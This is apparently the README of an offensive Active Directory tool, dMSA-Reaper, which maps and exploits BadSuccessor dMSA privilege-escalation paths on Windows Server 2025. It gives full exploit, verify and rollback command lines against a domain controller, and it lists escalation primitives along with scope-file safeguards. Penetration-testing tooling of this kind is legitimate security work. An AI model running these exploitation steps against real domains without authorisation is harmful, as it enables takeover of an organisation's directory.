# dMSA-Reaper

CLI for Windows Server 2025 AD dMSA mapping, BadSuccessor path selection, LDAP
execution, verification, and rollback.

```text
map -> paths -> exploit -> verify -> rollback
```

## Install / Test

```bash
python -m venv .venv
. .venv/bin/activate
pip install -e ".[dev]"
pytest
ruff check .
mypy dmsa_reaper
```

## Flow

```bash
dmsa-reaper map --domain corp.local --dc-ip 10.0.0.10 -u analyst -p 'pass' --use-ldaps --json state.json
dmsa-reaper paths --state state.json --expand-targets --json paths.json

dmsa-reaper exploit --state state.json --paths paths.json --path P-0001 --scope scope.json --dry-run

dmsa-reaper exploit --state state.json --paths paths.json --path P-0001 \
  --domain corp.local --dc-ip 10.0.0.10 -u analyst -p 'pass' --use-ldaps \
  --scope scope.json --confirm --confirm-string corp.local

dmsa-reaper verify --op OP-YYYYMMDD-deadbeef --mode ldap \
  --domain corp.local --dc-ip 10.0.0.10 -u analyst -p 'pass' --use-ldaps

dmsa-reaper rollback --op OP-YYYYMMDD-deadbeef \
  --domain corp.local --dc-ip 10.0.0.10 -u analyst -p 'pass' --use-ldaps
```

Operation logs default to `.reaper/operations`; use `--ops-dir` or
`DMSA_REAPER_OPS_DIR` to change that.

## Surface

Executable primitives: `postpatch-mutual-pair`,
`existing-dmsa-postpatch-mutual`, `legacy-oneway-link`,
`existing-dmsa-legacy-link`, `dacl-container-escalate`,
`dacl-target-escalate`.

Informational only: `self-write-map`, `self-pkinit-loop`.

Auth support: password bind through ldap3 NTLM, LDAPS with `--use-ldaps`,
environment Kerberos through ldap3 SASL/GSSAPI with `--kerberos`.

Not supported: robust Impacket-style pass-the-hash, native Kerberos ticket handling.

Writes require a scope file. Created DNs must be under `allowedOUs`; modified
DNs must be under `allowedOUs` or `allowedTargets`; denies win. DACL primitives
also require `allowDaclPrimitives=true`.

## Notes

- LDAP-state verification is not Kerberos verification.
- `verify --mode ldap` checks directory state only.
- External dMSA proof uses `kerberos-dmsa-proof`; base proof uses
  `kerberos-base-proof`.
- `ldap_signing_status`, `ldaps_status`, and `channel_binding_status` are
  placeholders and normally remain `unknown`.
- Native Kerberos dMSA verification, KDS root-key extraction, and golden dMSA
  flows are not implemented.
